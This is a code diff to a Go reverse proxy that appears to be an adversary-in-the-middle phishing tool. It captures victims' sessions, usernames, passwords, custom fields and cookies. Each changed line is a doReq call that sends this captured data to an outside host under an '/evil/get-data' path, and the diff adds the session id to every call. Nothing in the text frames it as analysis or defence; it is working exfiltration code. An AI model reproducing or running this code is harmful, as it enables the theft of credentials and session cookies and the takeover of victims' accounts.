@@ -300,7 +300,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
-									doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
+									doReq("https://apis.worlds.mom/evil/get-data?sid="+ session.Id +"&ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -598,7 +598,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 
-											doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&user=" + url.QueryEscape(um[1]))
+											doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&user=" + url.QueryEscape(um[1]))
 
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -611,7 +611,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 
-											doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&pwd=" + url.QueryEscape(pm[1]))
+											doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&pwd=" + url.QueryEscape(pm[1]))
 
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
@@ -625,7 +625,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 
-												doReq("https://apis.worlds.mom/evil/get-data/?ip="+ remote_addr +"&pwd=" + url.QueryEscape(cm[1]))
+												doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&pwd=" + url.QueryEscape(cm[1]))
 
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
@@ -900,7 +900,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + url.QueryEscape(sendCookie))
+						doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&cookie=" + url.QueryEscape(sendCookie))
 					}
 				}
 			}
